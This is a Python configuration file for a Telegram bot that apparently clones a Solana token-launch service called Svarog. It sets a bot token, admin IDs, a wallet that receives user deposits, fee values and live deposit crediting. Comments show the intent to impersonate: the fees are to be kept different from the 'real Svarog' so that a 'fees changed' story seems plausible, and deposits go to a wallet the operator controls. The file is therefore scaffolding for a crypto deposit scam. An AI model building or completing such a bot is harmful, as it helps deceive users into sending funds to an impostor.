import os
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(Path(__file__).with_name(".env"))

# ─── EDIT EVERYTHING IN THIS FILE ───────────────────────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError("Set BOT_TOKEN in svarog/.env or the process environment.")

# Your Telegram numeric ID (get it from @userinfobot). Admins see /admin.
ADMIN_IDS = [int(value.strip()) for value in os.environ.get("ADMIN_IDS", "").split(",") if value.strip()]
if not ADMIN_IDS:
    raise RuntimeError("Set at least one numeric ADMIN_IDS value in svarog/.env.")

# WHERE THE MONEY GOES. A Solana address you control. NOT an exchange
# deposit address (they rotate). Use a fresh Phantom wallet you own.
DEPOSIT_ADDRESS = os.environ.get("DEPOSIT_ADDRESS", "PUT_YOUR_SOLANA_ADDRESS_HERE")

# Branding
BRAND = "SVAROG"
TAGLINE = "Solana launch infrastructure"
SUPPORT = "@svarog_support"
CHANNEL = ""          # leave "" to hide the join gate
DOCS_URL = "https://telegra.ph/..."  # a telegra.ph page you write
SITE_URL = "svaroglauncher.com"

# Economics (keep these DIFFERENT from real Svarog so "fees changed" is plausible)
SOL_USD = 190.0
MIN_DEPOSIT = 0.02
LAUNCH_FEE = 0.02                  # charged from balance
BUNDLE_WALLET_FEE = 0.004          # per burner wallet
WITHDRAW_MIN = 0.05
WITHDRAW_FEE = 0.002
DEV_BUY_MAX = 20.0

# Live deposit detection (credits deposits automatically). Set False to
# credit manually from /admin.
LIVE_DETECTION = True
RPC_URL = os.environ.get("RPC_URL", "https://api.mainnet-beta.solana.com")

DB_PATH = "svarog.db"
